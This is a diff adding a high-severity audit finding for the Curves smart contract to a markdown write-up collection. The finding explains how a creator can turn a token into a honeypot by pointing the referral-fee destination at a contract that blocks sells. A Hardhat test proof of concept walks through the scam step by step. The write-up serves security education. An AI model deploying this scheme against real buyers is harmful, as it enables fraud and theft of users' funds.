@@ -539,3 +539,75 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
 ```
 
 </details>
+
+## 8.[High] Attack to make CurveSubject to be a HoneyPot
+
+### Honeypot
+
+- Summary: A vulnerability in the Curves contract allows malicious creators to turn any CurveSubject into a honeypot, where users can buy but cannot sell tokens. This is due to the referralFeeDestination call always being executed, even if the referral fee is zero. Malicious creators can set a custom referralFeeDestination contract that rejects sell transactions. This contract, EvilReferralFeeReceiver, blocks sells by reverting transactions if the user's token balance decreases.
+
+- Impact & Recommendation: It is recommended to use Solady’s forceSafeTransferETH() for safer ETH transfers. This issue is confirmed and deemed high severity as it requires significant effort to prevent scammers from exploiting it.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-curves#h-03-attack-to-make-curvesubject-to-be-a-honeypot) & [Report](https://code4rena.com/reports/2024-01-curves)
+
+<details><summary>POC</summary>
+
+```solidity
+import { expect, use } from "chai";
+import { solidity } from "ethereum-waffle";
+use(solidity);
+import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
+//@ts-ignore
+import { ethers } from "hardhat";
+import { type Curves } from "../contracts/types";
+import { buyToken } from "../tools/test.helpers";
+import { deployCurveContracts } from "./test.helpers";
+describe("Make Curve Subject To Be A Honey Pot test", () => {
+  let testContract;
+  let evilReferralFeeReceiver;
+  let owner: SignerWithAddress, evilSubjectCreator: SignerWithAddress,
+      alice: SignerWithAddress, bob: SignerWithAddress, others: SignerWithAddress[];
+  beforeEach(async () => {
+    testContract = await deployCurveContracts();
+    [owner, evilSubjectCreator, alice, bob, others] = await ethers.getSigners();
+    const EvilReferralFeeReceiver = await ethers.getContractFactory("EvilReferralFeeReceiver");
+    evilReferralFeeReceiver = await EvilReferralFeeReceiver.connect(evilSubjectCreator).deploy();
+  });
+  it("While 'HONEY POT' mode enabled, users can only buy, but can't sell any Curve token ", async () => {
+    // 1. The evil create a subject and set a normal referral fee receiver
+    await testContract.connect(evilSubjectCreator).mint(evilSubjectCreator.address);
+    await testContract.connect(evilSubjectCreator).setReferralFeeDestination(
+      evilSubjectCreator.address, evilSubjectCreator.address
+    );
+    // 2. The evil buy enough tokens at low price
+    await buyToken(testContract, evilSubjectCreator, evilSubjectCreator, 1);
+    await buyToken(testContract, evilSubjectCreator, evilSubjectCreator, 10);
+    // 3. victims buy or sell tokens normally
+    await buyToken(testContract, evilSubjectCreator, alice, 10);
+    await testContract.connect(alice).sellCurvesToken(evilSubjectCreator.address, 5);
+    await buyToken(testContract, evilSubjectCreator, bob, 10);
+    await testContract.connect(bob).sellCurvesToken(evilSubjectCreator.address, 5);
+    // 4. at some time point, the evil enables 'HONEY POT' mode by updating the referral fee receiver
+    await testContract.connect(evilSubjectCreator).setReferralFeeDestination(
+      evilSubjectCreator.address, evilReferralFeeReceiver.address
+    );
+    await evilReferralFeeReceiver.connect(evilSubjectCreator).setCurvesAndSubject(
+      testContract.address, evilSubjectCreator.address
+    );
+    await evilReferralFeeReceiver.connect(evilSubjectCreator).updateBalances(
+      [alice.address, bob.address]
+    );
+    // 5. now, victims can buy, but can't sell
+    await buyToken(testContract, evilSubjectCreator, alice, 1);
+    let tx = testContract.connect(alice).sellCurvesToken(evilSubjectCreator.address, 1);
+    expect(tx).to.revertedWith("CannotSendFunds()");
+    // 6. but the evil can sell tokens normally, of course at a higher price than buy and make profit
+    await  evilReferralFeeReceiver.connect(evilSubjectCreator).setAllowList(
+      evilSubjectCreator.address, true
+    );
+    testContract.connect(evilSubjectCreator).sellCurvesToken(evilSubjectCreator.address, 11);
+  });
+});
+
+```
+
+</details>
